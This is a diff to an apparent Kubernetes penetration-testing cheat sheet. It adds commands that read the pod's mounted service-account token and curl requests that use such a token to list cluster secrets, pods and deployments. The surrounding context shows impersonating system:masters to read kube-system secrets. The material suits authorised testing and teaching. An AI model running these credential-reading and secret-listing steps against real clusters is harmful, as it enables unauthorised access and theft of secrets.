@@ -12,7 +12,9 @@
     - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
     - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
     - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
-- [API addresses that you should know](#api-adresses-that-you-should-know)
+- [Privileged Service Account Token](#privileged-service-account-token)
+- [Interesting endpoints to reach](#interesting-endpoints-to-reach)
+- [API addresses that you should know](#api-addresses-that-you-should-know)
 - [References](#references)
 
 ## Tools
@@ -22,6 +24,16 @@
 * [kube-bench](https://github.com/aquasecurity/kube-bench). kube-bench is a Go application that checks whether Kubernetes is deployed securely by running the checks documented in the [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/).
 
 * [katacoda](https://katacoda.com/courses/kubernetes). Learn Kubernetes using interactive broser-based scenarios.
+
+## Service Token
+
+> As it turns out, when pods (a Kubernetes abstraction for a group of containers) are created they are automatically assigned the default service account, and a new volume is created containing the token for accessing the Kubernetes API. That volume is then mounted into all the containers in the pod.
+
+```powershell
+$ cat /var/run/secrets/kubernetes.io/serviceaccount
+
+# kubectl makes cluster compromise trivial as it will use that serviceaccount token without additional prompting
+```
 
 ## RBAC Configuration
 
@@ -111,6 +123,29 @@ curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Conten
 curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
 ```
 
+## Privileged Service Account Token
+
+```powershell
+$ cat /run/secrets/kubernetes.io/serviceaccount/token
+$ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
+```
+
+## Interesting endpoints to reach
+
+```powershell
+# List Pods
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/pods/
+
+# List secrets
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
+
+# List deployments
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments
+
+# List daemonsets
+curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets
+```
+
 
 ## API addresses that you should know 
 
@@ -164,3 +199,4 @@ http://<external-IP>:10255/pods
 
 - [Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019](https://securityboulevard.com/2019/08/kubernetes-pentest-methodology-part-1)
 - [Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019](https://securityboulevard.com/2019/09/kubernetes-pentest-methodology-part-2)
+- [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
